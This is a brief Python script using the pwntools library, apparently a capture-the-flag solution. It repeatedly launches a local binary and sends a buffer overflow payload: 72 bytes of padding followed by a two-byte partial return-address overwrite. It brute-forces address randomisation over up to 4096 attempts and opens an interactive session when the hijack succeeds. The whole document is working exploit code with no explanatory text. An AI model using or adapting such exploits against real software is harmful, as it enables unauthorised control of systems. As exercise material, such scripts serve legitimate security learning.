from pwn import *

for i in range(16**3):
    print i
    p=process('./p')
    p.recvuntil('want? ')
    p.sendline('A'*0x40+'B'*0x8+'\xa9\x11')
    p.recvuntil('one.\n')
    try:
        print p.recvline()
        p.interactive()
        break
    except:
        p.close()
        continue
